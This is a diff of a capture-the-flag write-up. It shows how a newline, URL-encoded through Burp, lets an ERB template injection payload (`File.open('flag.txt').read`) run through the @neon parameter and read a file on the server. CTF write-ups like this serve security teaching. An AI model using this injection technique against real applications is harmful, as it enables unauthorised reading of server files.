@@ -23,31 +23,31 @@ We send the request in burp w payload (url encode this)-
 a  
 <%= File.open('flag.txt').read %>
 ```
-Yes, I passed to new line . Why ?
-And If we want to run this code ,
 
-```
+we need to pass the main payload in a new line . Why ?
+in the above code `@neon` gets the parameter which we input and sends it to `index.erb`
+If we want to run this code, In this code,  :
+
+```html
 <%= File.open('flag.txt').read %>
 ```
 
 we have to pass new line like this :
 
-```
+```html
 <h1 class="glow"><%= @neon  
 <%= File.open('flag.txt').read %>%></h1>
 ```
 
-And we cant leave `@neon` empty , that's why I write it like :
+And we can't leave `@neon` empty , that's why we write it like :
 
-```
+```html
 <h1 class="glow"><%= a  
 <%= File.open('flag.txt').read %>%></h1>
 ```
 
-We need to use new line, but we cant use /n
-
-
-
+We need to use new line, but we cant use `/n`, we need to encode `/n` too.
+do `/n` encoding in burps decoder or just go to [this website](https://www.urlencoder.org/) and encode it w/o `/n`
 
 ### References
 
